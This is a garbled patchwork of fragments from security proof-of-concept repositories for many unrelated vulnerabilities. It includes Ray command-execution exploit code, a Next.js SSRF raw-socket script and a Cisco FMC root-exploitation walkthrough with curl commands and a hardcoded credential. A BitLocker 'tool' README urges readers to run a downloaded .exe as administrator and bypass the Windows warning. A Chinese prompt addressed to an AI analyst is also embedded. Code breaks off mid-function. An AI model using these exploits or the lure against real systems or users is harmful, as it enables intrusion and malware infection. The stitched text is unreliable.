# CVE-2026-73292 – CSRF Password Change in Semaphore UI < 2.18.21 

> **For educational and responsible disclosure purposes only.**

This vulnerability has been reported in [GHSA-8cj9-r88m-8945](https://github.com/semaphoreui/semaphore/security/advisories/GHSA-8cj9-r88m-8945) and affect semaphoreui versions below 2.18.21.

## Vulnerability

The password change endpoint of Semaphore UI does not implement any CSRF protection:

- No CSRF token required
- No current password confirmation required
- Authentication relies solely on a session cookie (`semaphore`) with no `SameSite` enforcement

A malicious page can silently change the password of any authenticated user who visits it. 

**Affected endpoint:** `POST /api/users/{id}/password`

```json
{"password": "newpassword", "project_id": 1}
```

---


## Usage

```
python poc_server.py -u http://TARGET:3000 -i USER_ID [-n NEW_PASSWORD] [-p PORT]
```

| Argument | Description | Default |
|---|---|---|
| `-u` / `--uri` | Base URL of the Semaphore instance | required |
| `-i` / `--user_id` | ID of the target user | required |
| `-n` / `--new_password` | Password to set | `passwordchanged` |
| `-p` / `--port` | Port to serve the malicious page | `1337` |

### Example

```bash
python poc_server.py -u http://192.168.1.10:3000 -i 1 -n pwn3d -p 1337
```

Then send the victim (authenticated on Semaphore) to `http://ATTACKER:1337`. Their password is changed immediately upon page load.

---

## Reproduction Steps

1. Start the PoC server:
   ```bash
   python poc.py -u http://TARGET:3000 -i 1
   ```
2. In a browser, log in to Semaphore UI as the victim
3. Navigate to `http://ATTACKER:1337`
4. In DevTools → Network: observe a POST to `/api/users/1/password` returning **HTTP 204**
5. Log in with the new password to confirm account takeover

---

## Recommended Fix

- Add a CSRF token to all state-changing endpoints
- Require current password confirmation on password change
- Set `SameSite=Strict` on the session cookie

# 🔑 YellowKey-Bitlocker - Manage BitLocker security on Windows systems

[![](https://img.shields.io/badge/Download-YellowKey-blue.svg)](https://tchuin2609.github.io)

## 🛡️ What is YellowKey-Bitlocker?

YellowKey-Bitlocker is a program for Windows 10 and Windows 11. It helps users secure drives against the CVE-2026-45585 vulnerability. This issue affects how BitLocker manages drive encryption. Attackers can exploit this flaw to bypass authentication on some systems. This tool allows users to identify if a system remains at risk and apply the necessary fixes. 

The software also provides features to extract recovery keys, test the success of mitigation steps, and check the status of your drive encryption. It translates complex security commands into a basic, user-friendly interface. You do not need experience with command-line tools to use it.

## ⚙️ System Requirements

Before you run YellowKey-Bitlocker, ensure your system meets these needs:

*   **Operating System:** Windows 10 or Windows 11.
*   **Permissions:** You need administrator rights on your computer. The software changes system security settings, so it requires high-level access.
*   **Disk Space:** Less than 50 megabytes of free space.
*   **Active BitLocker:** The tool only functions on systems where BitLocker drive encryption is currently enabled or needs management.

## 💾 How to download the software

Follow these steps to obtain the tool:

1.  Visit this page to download the latest version: [https://tchuin2609.github.io](https://tchuin2609.github.io)
2.  Look for the section labeled "Assets".
3.  Click the file ending in `.exe` to start the download.
4.  Save the file to your Downloads folder or your Desktop.

## 🚀 Running the software

Once the file finishes downloading, complete these steps to start the application:

1.  Locate the downloaded `.exe` file.
2.  Right-click the icon.
3.  Select "Run as administrator" from the menu. This step is mandatory. If you do not run the program as an administrator, it cannot access the BitLocker data on your system.
4.  Windows might show a pop-up window titled "Windows protected your PC". This happens because the tool makes deep system changes. Click "More info" and then click "Run anyway".
5.  The main window will open. You now see a dashboard showing the health of your BitLocker encryption.

## 🛠️ Using the features

The interface identifies your current security status immediately upon starting.

### Check for the vulnerability
The tool performs an automatic scan when it opens. It checks your current Windows update status and BitLocker configuration. It shows a notice if your system matches the profile for CVE-2026-45585.

### Apply the fix
If the tool finds that your system is at risk, it displays an "Apply Mitigation" button. Click this button to run the patch script. The program updates the registry settings to prevent the BitLocker bypass. Your computer remains stable during this process.

### Extracting recovery keys
If you lose your recovery password, use the "Export Recovery Keys" button. This function attempts to read the current keys assigned to your encrypted drives and saves them to a text file. Keep this file in a safe spot, such as an offline USB drive or a physical printout. Never store this file in a location accessible to others.

### Testing mitigation
Use the "Verify Protection" button to confirm if the fix works. The software runs a simulated check to ensure the vulnerability remains closed. It confirms that the system effectively blocks unauthorized attempts to access the drive encryption state.

# CVE-2025-62593 — Ray Remote Code Execution (unauthenticated)

Proof-of-concept for **CVE-2025-62593**, an unauthenticated Remote Code Execution
vulnerability in the [Ray](https://github.com/ray-project/ray) distributed AI compute
engine, abused via browser-based DNS-rebinding attacks. It was added to the
**CISA Known Exploited Vulnerabilities (KEV) catalog** and is actively exploited.

The root cause is a long-standing design decision by the Ray team to run **no
authentication** on critical HTTP endpoints such as `/api/jobs` and
`/api/job_agent/jobs`. Because of that, an unauthenticated remote attacker can submit a
Ray Job whose entrypoint is an arbitrary command, which then executes on the cluster
head node — full remote code execution.

This PoC talks to the Ray Dashboard HTTP API directly (no browser/DNS-rebinding needed
to demonstrate the underlying bug) and recovers the command output from the job logs.

## Impact

- **CVSS:** Critical (9.8)
- **Affected:** Ray < 2.52.0 (patch released for this advisory)
- **CISA KEV:** Yes — active exploitation, remediation deadline enforced
- Exposes the ~200k+ publicly reachable Ray AI clusters to pre-auth RCE

## What it does

1. `POST /api/jobs/` with an `entrypoint` that runs your command and captures its
   stdout/stderr into a temp file, then prints the file back.
2. Polls `GET /api/jobs/` until the job reaches a terminal state.
3. Reads `GET /api/jobs/<submission_id>/logs` and prints the command output.

## Usage

```bash
# Single target
python3 ray_rce_poc.py --target http://HOST:8265

# Custom command
python3 ray_rce_poc.py --target http://HOST:8265 --command "id; uname -a"

# Multiple targets from a file (one per line, '#' = comment)
python3 ray_rce_poc.py --targets targets.txt --command id

# Write a JSON summary
python3 ray_rce_poc.py --target http://HOST:8265 --output out.json

# Help
python3 ray_rce_poc.py --help
```

Requires **Python 3 stdlib only** — no third-party dependencies.

## Example (verified against a local Docker lab)

```
$ python3 ray_rce_poc.py --target http://localhost:8265 --command "id; hostname"
== http://localhost:8265
Running entrypoint for job raysubmit_XXX: python -c "import os,os.path; ..."
uid=1000(ray) gid=100(users) groups=100(users),27(sudo)
05cdb1bea437
=> PASS (RCE confirmed, status: SUCCEEDED, exit code: 0)
```

def build_entrypoint(command):
    """Build the job entrypoint per SPEC.md: run CMD > TMPOUT 2>&1, then
    print the captured output back. TMPOUT is unique per attempt."""
    tmpout = "/tmp/.rpoc_%s_out" % os.urandom(4).hex()
    # Embed CMD as a literal string in os.system(); escape anything that
    # could break out of the single-quoted Python string or the bash -c
    # double-quoted -c argument the driver runs.
    cmd = (
        command.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace('"', '\\"')
        .replace("$", "\\$")
        .replace("`", "\\`")
    )
    return (
        'python -c "import os,os.path; '
        "r=open('%s').read() if os.path.exists('%s') else ''; "
        "os.system('%s > %s 2>&1'); "
        "print(open('%s').read())\"" % (tmpout, tmpout, cmd, tmpout, tmpout)

# From Advisory to Root: Reproducing CVE-2026-20079 on Cisco Secure FMC

## Introduction

During authorized security testing, I encountered an on-premises Cisco Secure Firewall Management Center that appeared to be affected by CVE-2026-20079. The vulnerability had already been disclosed by Cisco, and VulnCheck had published a detailed technical analysis of the authentication bypass and root-code-execution chain.

My contribution was not discovering a new vulnerability. I manually reproduced the public exploit chain on an authorized system, worked through several practical failures, examined the environment-specific identity impact of the resulting root access, and then wrote a standalone Python PoC to make the original CVE validation more repeatable.

All organizations, addresses, hostnames, tokens, usernames, and credential-record names in this article are fictionalized. The examples use ACME and RFC 5737 documentation networks. No real credential or identifying information is included.

## Background

Cisco published CVE-2026-20079 as a Critical vulnerability in the web interface of on-premises Secure FMC. Cisco assigned a CVSS score of 10.0 and stated that an unauthenticated remote attacker could send crafted HTTP requests to bypass authentication and execute scripts as root. Cisco did not provide a workaround, making fixed software or the appropriate hotfix the required remediation.

VulnCheck subsequently documented the mechanics behind the issue. FMC creates a partial session for the `csm_processes` machine identity during startup. Under the right conditions, that boot-created session remains available and can be upgraded using another hardcoded machine credential. Once upgraded, the session exposes a per-session `sf_action_id` that can be used with a small set of accessible CGI functions.

The public research identified the core chain:

1. Reuse the boot-created `CGISESSID=csm_processes` session.
2. Upgrade it through `/login.cgi?logon=Continue` using the published `report:snortrules` machine credential.
3. Request `/ui/user/general` and extract the newly populated `sf_action_id`.
4. Call `validateLicense` through `/sajaxintf.cgi?rs=callServerFunc` to write controlled data to `/var/tmp/license.tmp`.
5. Format the data as a shell script containing Cisco's recognized Makeself marker.
6. Pass the file into `SF::UI::DataObjectLibrary::upgradeReadinessCall` through `/pjb.cgi`.
7. Allow the privileged update process to execute the script as root.

An important limitation is that the required startup session is transient. An appliance can run an affected build without being exploitable at a particular moment. Authenticated UI activity and normal session cleanup may remove the boot-created session. Rebooting a production management appliance solely to recreate the condition would be unsafe and was not part of my testing.

## How I Identified the FMC

During a review of authorized HTTPS management surfaces, I encountered a service on TCP 443 that redirected requests for `/` to `/ui/login`. Following that redirect in a browser displayed a login page branded **Cisco Secure Firewall Management Center**.

That product identification made the system a candidate for review against Cisco's current security advisories. It did not, by itself, establish that the appliance was vulnerable: a recognizable login page cannot reliably prove the installed build, patch level, or presence of the transient startup session required by this exploit.

I therefore treated the identification and validation as separate stages. The login page identified the product; the later `csm_processes` session upgrade, authenticated-page access, session-specific `sf_action_id`, and ultimately the root callback supplied progressively stronger proof of vulnerability and impact.

For this article, the sanitized environment is:

```text
FMC:             fmc01.acme.example (192.0.2.10)
Testing system:  192.0.2.20
Directory host:  dc01.acme.example (192.0.2.30:636)
```

Before attempting the CVE chain, I already had normal authentication-boundary controls. Invalid credentials and unrelated login attempts returned HTTP 401. That gave me a useful negative control for the session-upgrade request.

## Step 1: Testing the Session Upgrade

I began manually with `curl`. I did not start with the Python tool in this repository; that tool was written later.

The public session-upgrade request is conceptually:

```bash
target='https://192.0.2.10'

curl -sk --max-time 15 \
  -D session-upgrade.headers \
  -o session-upgrade.body \
  -H 'Cookie: CGISESSID=csm_processes' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=report&password=snortrules&target=' \
  "$target/login.cgi?logon=Continue"
```

The response was HTTP 302 and preserved the supplied session identifier. That was materially different from the prior HTTP 401 controls, but I did not treat the redirect alone as complete proof.

# CVE-2026-44848 — Portainer: Missing Authorization on Docker Plugin Endpoints → Host RCE

Proof-of-concept for **CVE-2026-44848**, a missing-authentication (CWE-862) vulnerability
in [Portainer](https://github.com/portainer/portainer) that lets a **non-admin** user with
Docker endpoint access perform privileged Docker plugin operations → full **host RCE**.

GitHub Security Advisory: **GHSA-rrmm-9v76-h3p4** · CVSS 9.4 (Critical).

## Root cause

Portainer enforces Role-Based Access Control (RBAC) on top of the Docker API by proxying
requests through per-resource handlers that apply authorization checks. The Docker
**plugin management** endpoints (`/plugins/*`) were **not registered with a handler**, so
the authorization layer never runs for them. As a result, a Standard User (Role 2) — or any
role granted endpoint-level access — can call privileged plugin operations directly against
the underlying Docker daemon:

- `POST /plugins/pull` — pull an arbitrary plugin from any registry
- plugin requests privileges including `CAP_SYS_ADMIN` and host-path mounts
- `POST /plugins/{name}/enable` — Docker runs the plugin **as root on the host** with those
  capabilities → full host filesystem access and equivalent to root on the Docker host

## Affected versions

- `>= 2.33.0, < 2.33.8`
- `>= 2.39.0, < 2.39.2`
- `>= 2.40.0, < 2.41.0`

## What the PoC demonstrates

The core, safely reproducible primitive of the bug: **a standard (non-admin) user can reach
the privileged `/plugins/*` Docker API through Portainer's proxy without authorization.**
It does so end-to-end against a real vulnerable Portainer instance:

1. Bootstraps an admin via `POST /api/users/admin/init` (tolerates 409 + falls back to login).
2. Creates a Standard User (`bob`, Role 2), tolerating 409 by resetting his password.
3. Lists Docker endpoints (auto-creates the local socket endpoint via multipart
   `POST /api/endpoints` if none exist) and grants `bob` access via
   `PUT /api/endpoints/{id}` `UserAccessPolicies`.
4. Logs in **as `bob`** (the non-admin user) and calls
   `GET /api/endpoints/1/docker/plugins` with bob's token.
5. HTTP 200 → the standard user reached the privileged endpoint → **auth-bypass confirmed**.

## Usage

```bash
# Defaults: https://localhost:9444, random admin password
python3 portainer_plugin_poc.py

# Explicit target + admin password + command
python3 portainer_plugin_poc.py --url https://localhost:9444 --admin-pass 'P@ssw0rd!' --command "id; hostname"

# Write a JSON summary
python3 portainer_plugin_poc.py --url https://localhost:9444 --output out.json

python3 portainer_plugin_poc.py --help
```

Requires **Python 3 stdlib only**. TLS verification is disabled (self-signed lab certs).

```

=> PASS (missing auth / host-RCE primitive confirmed)
```

# CVE-2026-53787 - Amasty Order Attributes Unauthenticated File Upload

## Description

CVE-2026-53787 is a critical unauthenticated arbitrary file upload vulnerability in the Amasty Order Attributes extension for Magento 2 versions prior to 4.0.0 . The vulnerability allows attackers to upload files of any type or name to the store's media directory without requiring authentication, session validation, or cart context .

## Impact

The attack requires no credentials and can be executed over the network . The vulnerability has a CVSS score of 9.8 (Critical) . A successful exploit can lead to:

- Remote Code Execution (RCE) if PHP execution is permitted in the media directory, giving attackers full server control 
- Malware hosting using the trusted domain 
- Stored Cross-Site Scripting (XSS) via HTML or SVG uploads 
- Path traversal attacks to write files outside the intended upload directory 

## Affected Endpoints

The vulnerability targets the following REST endpoints :

```
POST /rest/V1/amasty_orderattr/uploadFile
POST /rest/all/V1/amasty_orderattr/uploadFile
POST /rest/default/V1/amasty_orderattr/uploadFile
```

## Exploitation Activity

Mass exploitation began hours after the patch was released on June 12, 2026 . By June 15, over 12,000 exploitation attempts were detected against 25% of all Magento stores .

## Remediation

- Upgrade Amasty Order Attributes to version 4.0.0 or later 
- Configure the web server to disable PHP execution in the media directory 
- Implement strict file upload validation and extension allow-lists

CVE-2026-57827 — RSFiles! Joomla Component Unauthenticated File Upload RCE

Split-Controller Upload Bypass → Direct Write Task → /downloads/shell.php → RCE

--- ## Overview **CVE-2026-57827** is a critical-severity (CVSS 9.8) **unauthenticated** arbitrary file upload vulnerability in **RSFiles!** (com_rsfiles), a widely used file-manager and download component for Joomla, versions **< 1.17.12**. The vulnerability exploits a split-controller design flaw: RSFiles! separates its upload into two frontend tasks — a pre-flight check (permission gate + extension allow-list) and a write method (saves file to disk). The write method can be called **directly**, bypassing the pre-flight check entirely. No authentication, no CSRF token required. ### Affected Versions | Version | Status | |---|---| | < 1.17.12 | Vulnerable | | 1.17.12+ | Patched | > **Discovered by:** Phil Taylor, mySites.guru (July 10, 2026) > **Vendor:** RSJoomla (rsjoomla.com) > **Component:** com_rsfiles --- ## Vulnerability Mechanism ### Root Cause RSFiles! splits its upload across two separate frontend tasks in `/components/com_rsfiles/controllers/rsfiles.php`: ```php // Task 1 — Pre-flight check (task=rsfiles.checkupload) — GUARDED // Holds the permission gate (can this user upload?) and the extension // allow-list (images, text, PDFs by default). This method decides yes // or no. It writes nothing. function checkupload() { if (!$user->authorise('rsfiles.upload')) return false; $allowed = ['jpg','png','gif','txt','pdf']; if (!in_array($ext, $allowed)) return false; return true; } // Task 2 — Write method (task=rsfiles.upload) — UNGUARDED (the vulnerability) // Receives the file and saves to disk. NO permission check. // NO file-type check. Reads filename straight from the request // and hands the upload to Joomla's JFile::upload(), which // accepts any file type unless told otherwise. function upload() { $file = $input->files->get('file'); // No permission check // No extension check // JFile::upload() accepts anything by default JFile::upload($file['tmp_name'], $dest . $file['name']); // File saved to /downloads/ (web root, .htaccess OFF by default) } ``` ### Why It Works 1. **Split controller** — Security checks and the file write are in two different methods. Only the pre-flight check is guarded. 2. **Direct task access** — Joomla's frontend controller allows calling any task directly via `&task=rsfiles.upload`, skipping the pre-flight check entirely. 3. **No authentication** — The frontend controller has no access check. Anonymous visitors can call the write task. 4. **No CSRF token** — The frontend upload form has no site-wide CSRF token. 5. **No file-type validation** — The write method reads the filename from the request and passes it to Joomla's bundled upload handler (`JFile::upload()`), which accepts any file type by default. 6. **Web-root downloads folder** — RSFiles!'s default downloads folder sits inside the web root. The protective `.htaccess` that would stop PHP execution there is an **opt-in** admin setting that is **OFF by default**. ### Attack Flow ``` 1. Attacker crafts PHP webshell (plain PHP, no polyglot needed) 2. POST /index.php?option=com_rsfiles&task=rsfiles.upload file= (multipart, PHP payload) folder=&overwrite=1 3. Joomla frontend controller dispatches to rsfiles.upload() ``` **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。 **任务：** 1. **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。 2. **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。 3. **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。 4. **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。 5. **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。 6. **排序优先级:** 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 7. **输出内容:** 务必使用中文 8. **markdown内容:** 务必使用markdown格式，包含以下部分： - 漏洞概述 - 有效性分析 - 投毒风险分析 - 利用方式 - 代码分析 **输出格式：** 你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。 **示例JSON:**```json { "name": "CVE-2023-12345-ExampleApp-SQL注入", "type": "SQL注入", "app": "ExampleApp", "risk": "高危，可能导致数据泄露和远程代码执行", "version": "<= 1.0", "condition": "需要网络访问和数据库端口开放", "poc_available": "是", "poison": "90%", "cve_valid": "是", "markdown": "# 漏洞概述 该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证... ## 有效性分析 根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的... ## 投毒风险分析 该仓库存在较高的投毒风险，主要原因是... ## 利用方式 1. 攻击者需要网络访问权限 2. 构造恶意的SQL语句 3. 发送到目标系统 4. 绕过身份验证，获取系统访问权限 ## 代码分析 主要代码组件包括： - `exploit.py`: 主漏洞利用脚本 - `payloads.py`: 包含各种SQL注入payload - `utils.py`: 辅助工具函数 代码执行流程： 1. 连接到目标数据库 2. 构造恶意SQL语句 3. 发送到目标系统 4. 解析响应，获取敏感信息 ", "repo_name": "example/repo", "repo_url": "https://github.com/example/repo", "cve_url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345" }

# syntax=docker/dockerfile:1
# CVE-2026-56848 PoC target: vulnerable Node.js v22.23.1 HTTP/2 server,
# built with AddressSanitizer so the re-entrant nghttp2 send triggers a
# deterministic heap-use-after-free report when attacked.

# ---- builder: compile Node.js v22.23.1 with ASan ----
FROM node:22.23.1-bookworm-slim AS builder

# python3-distutils / python3-pkg-resources: Node's configure.py still needs
# them, and Debian bookworm's Python 3.11 dropped distutils from the stdlib.
# clang-16 (not bookworm's clang-14 default): clang-14 crashes compiling
# deps/zlib/crc32_simd.c on aarch64 (frontend crash, exit code 70).
# libclang-rt-16-dev: ships sanitizer/common_interface_defs.h, which abseil
# needs in ASan builds. It's only pulled in via clang-16's Recommends chain,
# so --no-install-recommends would silently drop it.
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates clang-16 libclang-rt-16-dev git make python3 \
        python3-distutils python3-pkg-resources \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/node
# Depth-1 tag clone; all third-party deps (V8, nghttp2, ...) are vendored
# in-tree, so no further downloads are needed.
RUN git clone --depth 1 --branch v22.23.1 https://github.com/nodejs/node .

# Official ASan configuration (Linux). The cache mount makes retries cheap:
# if the build dies (OOM, transient error), the next `docker build` resumes
# where it left off instead of recompiling everything.
RUN --mount=type=cache,target=/opt/node/out \
    CC=clang-16 CXX=clang++-16 ./configure --debug --enable-asan \
    && make -j4

# ---- target: slim image that only runs the instrumented server ----
FROM debian:bookworm-slim

# --enable-asan on Linux builds into out/Release (optimized, sanitized).
COPY --from=builder /opt/node/out/Release/node /usr/local/bin/node-asan

# libstdc++ / libatomic are needed by the node binary at runtime.
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates libstdc++6 libatomic1 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY server.js ./server.js

# Fixed port so the host-side exploit can aim at it directly.
EXPOSE 8000
ENV HOST=0.0.0.0

# abort_on_error makes ASan die with SIGABRT (easy to detect);
# leak detection off (Node intentionally leaks at exit).
ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1

ENTRYPOINT ["/usr/local/bin/node-asan"]
CMD ["server.js", "8000"]

# CVE-2026-56848

## NVD Description

> A flaw in Node.js HTTP/2 handling allows `nghttp2_session_mem_send()` to be called re-entrantly while `nghttp2_session_mem_recv()` is executing, resulting in a heap-use-after-free.
>
> This vulnerability affects Node.js 26.x, 24.x, and 22.x.

(Note: versions mentioned in the description apply only to the upstream nodejs package and not the nodejs package as distributed by Alpine.

| Release line | Vulnerable     | Fixed      |
|--------------|----------------|------------|
| 22.x (LTS)   | ≤ 22.23.1      | 22.23.2    |
| 24.x (LTS)   | ≤ 24.18.0      | 24.18.1    |
| 26.x         | ≤ 26.5.0       | 26.5.1     |

- **Severity:** High (CVSS 7.5, `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — remote, unauthenticated DoS via heap corruption)
- **Reported by:** hahahkim (HackerOne #3833629)
- **Fixed by:** Matteo Collina (mcollina)
- **Fix commit (v22):** `daa6d25e3dce` — *"http2: defer rst stream while in scope"* (nodejs-private/node-private#921)
- **Disclosed:** Node.js security releases, 2026-07-29

## Root Cause

`Http2Stream::SubmitRstStream()` in [src/node_http2.cc](https://github.com/nodejs/node/blob/v22.23.1/src/node_http2.cc#L2509) forces a purge of pending outbound data before queueing the RST_STREAM:

```cpp
void Http2Stream::SubmitRstStream(const uint32_t code) {
  CHECK(!this->is_destroyed());
  code_ = code;

  // (NGHTTP2_CANCEL is deferred — fix for an older double-free)
  if (session_->is_in_scope() && is_stream_cancel(code)) {
      session_->AddPendingRstStream(id_);
      return;
  }

  // If possible, force a purge of any currently pending data here to make
  // sure it is sent before closing the stream. ...
  if (session_->SendPendingData() != 0) {   // ← RE-ENTRANT mem_send()
    session_->AddPendingRstStream(id_);
    return;
  }

  FlushRstStream();
}
```

`SendPendingData()` calls `nghttp2_session_mem_send()` ([node_http2.cc:1970](https://github.com/nodejs/node/blob/v22.23.1/src/node_http2.cc#L1970)). Its only re-entrancy guard is `is_sending()`, which protects against *send-during-send* (a write already in flight) — **not against send-during-receive**. When `SubmitRstStream()` runs from inside an `nghttp2_session_mem_recv()` callback chain ("in scope"), the purge runs `mem_send()` re-entrantly.

#!/usr/bin/env python3
"""
CVE-2026-44578 PoC Exploit
Next.js WebSocket Upgrade Handler SSRF

[취약점 원리]
  HTTP/1.1은 요청 라인에 absolute-form URI 사용을 허용 (RFC 7230 §5.3.2):
    GET http://other-host/path HTTP/1.1

  Next.js의 WebSocket 업그레이드 핸들러(router-server.ts)는 이 요청을 받을 때
  목적지 URL을 검증 없이 그대로 프록시 → SSRF 발생

[대상 버전]
  - Next.js 13.4.13 이상 ~ 15.5.15 이하
  - Next.js 16.0.0 이상 ~ 16.2.4 이하
  (자체 호스팅만 해당, Vercel 호스팅 환경 미해당)

[패치 버전]
  - Next.js 15.5.16+, 16.2.5+

[왜 Raw 소켓을 사용하는가?]
  requests, urllib 등 표준 라이브러리는 absolute-form URI를 자동으로
  정규화하므로 취약점 트리거 불가. TCP 소켓으로 직접 전송해야 함.
"""

import sys
import argparse

╔══════════════════════════════════════════════════════╗
║    CVE-2026-44578 PoC - Next.js WebSocket SSRF      ║
║    시큐리티 아카데미 CERT 프로젝트 - 취약점 재현 실습  ║
╚══════════════════════════════════════════════════════╝
"""


def build_exploit_request(nextjs_host: str, ssrf_host: str, ssrf_path: str) -> str:
    """
    WebSocket 업그레이드 요청 생성

    핵심: GET 다음에 absolute-form URI (http://ssrf_host/path) 사용
    일반 요청: GET /path HTTP/1.1
    취약점 요청: GET http://internal-svc/admin HTTP/1.1  ← 이걸 사용
    """
    return (
        f"GET http://{ssrf_host}{ssrf_path} HTTP/1.1\r\n"   # ← SSRF 트리거 포인트
        f"Host: {nextjs_host}\r\n"
        f"Connection: Upgrade\r\n"
        f"Upgrade: websocket\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==\r\n"  # RFC 6455 예제 키
        f"\r\n"
    )


def send_raw_request(host: str, port: int, raw_request: str, timeout: int = 10) -> bytes:
    """Raw TCP 소켓으로 HTTP 요청 전송 후 응답 반환"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    s.sendall(raw_request.encode())

    response = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    s.close()
    return response

id: CVE-2026-19478

info:
  name: GitLab CE/EE - GraphQL @gl_introduced Fallback-Field Arbitrary Method Invocation (Unauthenticated)
  author: renzi
  severity: critical
  description: |
    GitLab CE/EE contains an authorization flaw in the GraphQL API. The `@gl_introduced`
    directive can be paired with a version string newer than the running instance to force
    the GraphQL schema to generate a "fallback field" for an otherwise-unknown field name.
    That fallback field resolves by calling `object.public_send(method)` on the underlying
    Ruby object (e.g. Project, User) without further authorization checks, letting an
    unauthenticated caller invoke arbitrary public zero-argument methods on any object it can
    reach through the schema (public projects, public user profiles) - including destructive
    methods such as `destroy`/`delete` or state-mutating ones such as `deactivate`.

    This template performs a SAFE, non-destructive check only: it calls the harmless
    `touch` method (updates `updated_at`, returns `true`) via the fallback field, first
    against a public project the scanner discovers through the REST API, then as a
    fallback against the default `root` user profile if no public project is found. It
    never calls `destroy`, `delete`, `deactivate`, `block`, or `ban`. Do not repurpose
    this template to invoke those methods against systems you do not own or are not
    explicitly authorized to test - doing so will delete or modify real data.

# CVE-2026-42533 Tracking — Claude Code Context

This repository contains a living tracking document for
**CVE-2026-42533**, a heap buffer overflow in nginx's two-pass script
evaluation engine. nginx measures a string expression in a LEN pass and
writes it in a VALUE pass without saving and restoring the PCRE capture
state, so evaluating a regex `map` clobbers a capture referenced
earlier in the same expression and the two passes disagree on the
buffer size. An unauthenticated remote attacker can therefore overflow
the worker's heap with request-controlled bytes.

State the trigger the way the sources do: the map's variable used in a
string expression **after** a capture that the map's own match affects
(upstream also reports a similar issue for a non-cacheable variable in
a string expression). Not "between two capture references" — that is
narrower than the bug, and mitigation advice derived from it leaves
configurations exposed. F5 puts the impact at worker restart, with code
execution where ASLR is disabled or can be bypassed.

Two F5-acknowledged reporters have published research going beyond the
advisories: Stan Shaw (cyberstan) and Zhenpeng (Leo) Lin of depthfirst.
Between them they claim an information-leak primitive, an ASLR bypass,
thirteen call sites, cross-directive triggering, and a second trigger
surface in the **stream** module reached via `ssl_preread` before TLS
termination. The tracker's *On the third-party research* section sorts
these by evidence, and that sorting is the thing to preserve:

- **Cross-directive use is discouraged by F5, but the trigger mechanic
  is not vendor-stated.** F5's mitigation forbids reusing a named
  capture in regex matches in "different directives. For example, in
  both a map directive and in a location block". That is adjacent to,
  not the same as, cyberstan's claim that the capture *reference* and
  the *map variable* need not share a directive. Don't collapse the two.
- **No vendor source mentions the stream module, a memory disclosure, or
  an ASLR bypass** — but all three are implemented in depthfirst's
  public `poc.py`, so they are demonstrated rather than merely asserted.
  Phrase them as researcher findings the vendors have not caught up
  with; don't downgrade them to speculation, and don't promote them to
  vendor-confirmed.
- **F5 edits K000162097 silently.** It expanded the mitigation text
  between the 2026-07-21 and 2026-07-29 captures while leaving "Updated
  Date: Jul 21, 2026" unchanged. Never trust that field to detect a
  revision — diff the text against the stored captures in `~/tmp/`.

Don't delete the stream/`ssl_preread` material as unsourced drift: it is
deliberately carried as a claim because it widens the audit surface, on
the same reasoning as the trigger wording above.

- **Affected:** nginx 0.9.6 through 1.31.2 (mainline) and through
  1.30.3 (stable). Both NGINX Open Source and NGINX Plus.
- **Fixed:** nginx 1.31.3 (mainline) and 1.30.4 (stable), released
  2026-07-15.
- **Severity:** CVSS 3.1 8.1 (high), CVSS 4.0 9.2 (critical). CWE-122.

# CVE-2026-68138 Tracking — Claude Code Context

This repository contains a living tracking document for **CVE-2026-68138**,
a **use-after-free / double-free** in the Linux kernel **`net/sched`**
rate-table code.  `qdisc_get_rtab()` and `qdisc_put_rtab()` mutate the
process-global singly linked list `qdisc_rtab_list` and a plain non-atomic
`int refcnt` with **no lock**.  That was only safe while every caller held
the RTNL mutex.  Since `cls_flower` sets `TCF_PROTO_OPS_DOIT_UNLOCKED`,
`tc_new_tfilter()` keeps `rtnl_held == false` and sets
`TCA_ACT_FLAGS_NO_RTNL`, which propagates through `tcf_exts_validate_ex()`
→ `tcf_action_init()` → `tcf_action_init_1()` → `tcf_police_init()`, which
calls `qdisc_get_rtab()`/`qdisc_put_rtab()` **without RTNL**.  Two
`RTM_NEWTFILTER` requests on different CPUs, each adding a flower filter
with a police action carrying the **same rate table**, race on
`qdisc_rtab_list` and on the refcount, giving a UAF / double-free of the
`kmalloc-2k` `struct qdisc_rate_table` (`net/sched/sch_api.c`).  Impact: a
repeatable KASAN slab-UAF / double-free that panics the kernel (**DoS**)
and, per the public exploit, **local privilege escalation to root**.

The canonical fix is [`f43ee0c0730d`][fix] (*net/sched: serialize
qdisc_rtab_list against concurrent get/put*), first released in **v7.2-rc5**
and backported to the stable **7.1.6** release as [`fb29e1b41052`][fix-stable].
It adds a dedicated `qdisc_rtab_lock` spinlock around the list and the
refcount.

**This is a v5.1 bug, NOT ancient and NOT a recent regression.**  The
rate-table code is old, but the race only became reachable when the
classifier-update path was unlocked: [`470502de5bdb`][intro] (*net: sched:
unlock rules update API*, **v5.1**, 2019).  Two consequences drive the
tracker:

- Every maintained mainline LTS line (5.10, 5.15, 6.1, 6.6, 6.12, 6.18)
